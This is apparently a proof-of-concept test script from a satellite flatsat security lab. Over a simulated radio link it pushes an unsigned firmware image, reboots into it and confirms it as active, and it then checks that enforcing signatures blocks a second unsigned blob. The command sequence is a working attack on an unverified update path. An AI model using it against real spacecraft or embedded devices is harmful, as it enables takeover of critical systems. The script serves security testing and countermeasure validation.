#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys, struct
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs


# V-18  OTA image push/activate with no signature verification: attacker
# writes an arbitrary blob to the shadow slot, flips the boot slot, and
# the craft CONFIRMS his firmware as good. Then flip the signature
# requirement ON to measure the counter-mesure.
# SPARTA: SC-0002 (unverified software update)
def main(dev, ev):
    body = b"RVUHACKEDIMAGE2026"
    crc = fs.crc16_ccitt(body)
    r = dev.find(dev.tc(0x1F, bytes([0]) + struct.pack(">I", 0) + bytes([len(body)])
                 + struct.pack(">H", crc) + body, via="radio"), 0x1F)[0]
    check(r.u8(2) == 1, "chunk accepted (CRC only)")
    r = dev.find(dev.tc(0x1F, bytes([1]), via="radio"), 0x1F)[0]   # finalize
    check(r.u8(2) == 1 and dev.sim.flash["ota"]["pending_boot"] == 1,
          "finalize accepted WITHOUT signature check")
    ev.log(f"finalize ok, pending_boot=1, image hash="
           f"{dev.sim.flash['ota']['hash'].hex()} (no trust anchor)")
    dev.tc(0x02, b"", via="radio")                    # RESETC into slot B
    st = dev.find(dev.tc(0x1F, bytes([3]), via="usb"), 0x1F)[0]
    ev.log(f"post-reboot: booted_slot={st.u8(5)} active={st.u8(2)} "
           f"boot_try={st.u8(4)}")
    check(st.u8(5) == 1, "booted attacker slot B")
    r = dev.find(dev.tc(0x1F, bytes([2]), via="usb"), 0x1F)[0]     # confirm
    check(r.u8(2) == 1, "confirmation accepted -> slot B becomes active")
    st = dev.find(dev.tc(0x1F, bytes([3]), via="usb"), 0x1F)[0]
    check(st.u8(2) == 1, "active slot is now the attacker image")

    # counter-mesure: require a signature over the pushed image
    dev.tc(0x1F, bytes([6]) + fs.fnv_digest(b"vendor-signature") +
           struct.pack(">I", 8) + bytes([1]), via="usb")
    body2 = b"ATTACKER-BLOB-2!!"
    r = dev.find(dev.tc(0x1F, bytes([0]) + struct.pack(">I", 0)
                 + bytes([len(body2)]) + struct.pack(">H", fs.crc16_ccitt(body2))
                 + body2, via="radio"), 0x1F)[0]
    r2 = dev.find(dev.tc(0x1F, bytes([1]), via="radio"), 0x1F)[0]
    ev.log(f"with sig_required: finalize ok={r2.u8(2)} (0 = rejected)")
    check(r2.u8(2) == 0, "unsigned image rejected once signature enforced")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V-18 unsigned OTA image install", main))
